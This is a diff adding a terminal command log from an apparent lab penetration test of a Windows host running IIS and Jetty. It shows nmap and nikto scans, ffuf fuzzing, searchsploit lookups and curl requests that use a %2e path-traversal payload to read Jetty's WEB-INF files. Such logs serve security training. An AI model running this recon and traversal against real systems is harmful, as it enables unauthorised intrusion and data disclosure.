@@ -1,0 +1,79 @@
+[2026-02-04 19:12:23] [pane=%0] [CMD] cat ~/.ip
+[2026-02-04 19:15:55] [pane=%0] [CMD] echo export IP=10.129.228.112
+[2026-02-04 19:16:03] [pane=%0] [CMD] echo $IP
+[2026-02-04 19:16:28] [pane=%0] [CMD] echo export IP=10.129.228.112 > ~/.ip
+[2026-02-04 19:16:33] [pane=%0] [CMD] echo $IP
+[2026-02-04 19:16:40] [pane=%0] [CMD] cat $IP
+[2026-02-04 19:16:54] [pane=%0] [CMD] $IP
+[2026-02-04 19:17:27] [pane=%0] [CMD] cat $IP
+[2026-02-04 19:17:31] [pane=%0] [CMD] echo $IP
+[2026-02-04 19:17:51] [pane=%0] [CMD] printenv
+[2026-02-04 19:18:49] [pane=%0] [CMD] printenv $IP
+[2026-02-04 19:18:53] [pane=%0] [CMD] printenv IP
+[2026-02-04 19:19:17] [pane=%0] [CMD]  export IP=10.129.228.112
+[2026-02-04 19:19:22] [pane=%0] [CMD] printenv IP
+[2026-02-04 19:20:44] [pane=%0] [CMD] nmap -p- --min-rate 10000 -oA Jeeves/nmap/JeevesAllPorts 10.129.228.112
+[2026-02-04 19:22:48] [pane=%1] [CMD] cd Jeeves/nmap
+[2026-02-04 19:22:49] [pane=%1] [CMD] ll
+[2026-02-04 19:22:54] [pane=%1] [CMD] rm JeevesAllPorts.*
+[2026-02-04 19:23:02] [pane=%0] [CMD] nmap -p- --min-rate 3000 -Pn -oA Jeeves/nmap/JeevesAllPorts 10.129.228.112
+[2026-02-04 19:24:52] [pane=%0] [CMD] grep "open" Jeeves/nmap/JeevesAllPorts.nmap
+[2026-02-04 19:26:52] [pane=%0] [CMD] ports=$(awk '/^[0-9]+\/tcp/ {print $1}' Jeeves/nmap/JeevesAllPorts.nmap | cut -d/ -f1 | paste -sd,)
+[2026-02-04 19:26:59] [pane=%0] [CMD] cat $ports
+[2026-02-04 19:27:07] [pane=%0] [CMD] echo $ports
+[2026-02-04 19:27:50] [pane=%0] [CMD] nmap -p$ports -sSCV --min-rate=2000 -Pn -oN JeevesServicesVersions.txt $IP
+[2026-02-04 19:27:57] [pane=%1] [CMD] $IP
+[2026-02-04 19:28:01] [pane=%1] [CMD] cat $IP
+[2026-02-04 19:28:06] [pane=%1] [CMD] echo $IP
+[2026-02-04 19:31:16] [pane=%0] [CMD] cd Jeeves
+[2026-02-04 19:31:21] [pane=%1] [CMD] cd ..
+[2026-02-04 19:32:11] [pane=%0] [CMD] ls nmap
+[2026-02-04 19:32:38] [pane=%0] [CMD] ls
+[2026-02-04 19:34:04] [pane=%0] [CMD] nmap -p$ports -sSCV --min-rate=2000 -Pn -oN nmap/JeevesServicesVersions.txt 10.120.228.112
+[2026-02-04 19:34:40] [pane=%0] [CMD] nmap $IP -p$ports -sSCV --min-rate=2000 -Pn -oN nmap/JeevesServicesVersions.txt 
+[2026-02-04 19:34:54] [pane=%1] [CMD] cd nmap
+[2026-02-04 19:34:55] [pane=%1] [CMD] ll
+[2026-02-04 19:35:12] [pane=%1] [CMD] ll
+[2026-02-04 19:35:32] [pane=%1] [CMD] ll
+[2026-02-04 14:18:07] [pane=%0] [CMD] : #note browsing to http://10.129.228.112:50000 reveals an http error 404 but also a "Powered by Jetty:// 9.4.z-SNAPSHOT"
+[2026-02-04 14:22:32] [pane=%0] [CMD] ffuf -u http://10.129.228.112:50000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o ffuf/jetty-dirs.json -of json -mc 200,204,301,302,307,401,403
+[2026-02-04 14:24:38] [pane=%0] [CMD] curl -s http://10.129.228.112 | head -50
+[2026-02-04 15:30:36] [pane=%0] [CMD] ll
+[2026-02-04 15:30:47] [pane=%0] [CMD] cd ffuf
+[2026-02-04 15:30:47] [pane=%0] [CMD] ll
+[2026-02-04 15:31:30] [pane=%0] [CMD] vim jenkinsPaths.sh
+[2026-02-04 15:32:00] [pane=%0] [CMD] ll
+[2026-02-04 15:32:11] [pane=%0] [CMD] chmod +x jenkinsPaths.sh
+[2026-02-04 15:32:16] [pane=%0] [CMD] ./jenkinsPaths.sh
+[2026-02-04 15:37:41] [pane=%0] [CMD] ffuf -u http://10.129.228.112:50000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -o ffuf/jetty-common.json -of json -mc all -fc 404
+[2026-02-04 15:37:59] [pane=%0] [CMD] ffuf -u http://10.129.228.112:50000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -o jetty-common.json -of json -mc all -fc 404
+[2026-02-04 15:41:53] [pane=%0] [CMD] ffuf -u http://10.129.228.112/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -o iis-dirs.json -of json -mc all -fc 404 -e .html,.asp,.aspx,.txt
+[2026-02-04 15:48:38] [pane=%0] [CMD] curl -s "http://10.129.228.112/error.html?q=test" | head -30
+[2026-02-04 15:49:01] [pane=%0] [CMD] ll
+[2026-02-04 15:50:56] [pane=%0] [CMD] vim iisWindowsFiles.sh
+[2026-02-04 15:51:49] [pane=%0] [CMD] chmod +x iisWindowsFiles.sh
+[2026-02-04 15:51:52] [pane=%0] [CMD] ./iisWindowsFiles.sh
+[2026-02-04 16:27:40] [pane=%0] [CMD] ffuf -u http://10.129.228.112/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o jetty-big.json -of json -mc all -fc 404 -e -t 100
+[2026-02-04 16:28:06] [pane=%1] [CMD] curl -X OPTIONS -v http://10.129.228.112:50000/ 2>&1 | grep -E "Allow:|X-"
+[2026-02-04 16:28:58] [pane=%1] [CMD] nikto -h http://10.129.228.112:50000 -output ../logs/nitko-50000.txt
+[2026-02-04 16:29:37] [pane=%0] [CMD] curl -H "Host: localhost" http://10.129.228.112:50000/
+[2026-02-04 16:29:43] [pane=%0] [CMD] curl -H "Host: 127.0.0.1" http://10.129.228.112:50000/
+[2026-02-04 16:38:09] [pane=%1] [CMD] searchsploit jetty
+[2026-02-04 16:44:44] [pane=%1] [CMD] searchsploit -x java/webapps/50438.txt
+[2026-02-04 16:45:43] [pane=%1] [CMD] searchsploit -x windows/remote/36318.txt
+[2026-02-04 16:48:20] [pane=%1] [CMD] cd ../logs
+[2026-02-04 16:48:21] [pane=%1] [CMD] ll
+[2026-02-04 16:49:14] [pane=%1] [CMD] searchsploit -m java/webapps/50438.txt
+[2026-02-04 16:49:23] [pane=%1] [CMD] searchsploit -m windows/remote/36318.txt
+[2026-02-04 16:49:42] [pane=%1] [CMD] cat 50438.txt
+[2026-02-04 16:49:47] [pane=%1] [CMD] cat 36318.txt
+[2026-02-04 16:58:50] [pane=%1] [CMD] curl -v http://10.129.228.112:50000/%2e/WEB-INF/web.xml
+[2026-02-04 16:59:12] [pane=%1] [CMD] curl -v http://10.129.228.112:50000/%2e/WEB-INF/web.xml
+[2026-02-04 16:59:47] [pane=%1] [CMD] curl http://10.129.228.112:50000/%2e/WEB-INF/
+[2026-02-04 17:00:55] [pane=%1] [CMD] curl http://10.129.228.112:50000/%2e/WEB-INF/classes
+[2026-02-04 17:01:47] [pane=%1] [CMD] curl http://10.129.228.112:50000/%2e/WEB-INF/MANIFEST.MF
+[2026-02-04 17:08:44] [pane=%1] [CMD] ll
+[2026-02-04 17:13:50] [pane=%1] [CMD] vim commonContextPaths.sh
+[2026-02-04 17:14:14] [pane=%1] [CMD] chmod +x commonContextPaths.sh
+[2026-02-04 17:14:21] [pane=%1] [CMD] ./commonContextPaths.sh
+[2026-02-04 17:15:49] [pane=%1] [CMD] ffuf -u http://10.129.228.112:50000/FUZZ/%2e/WEB-INF/web.xml -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200
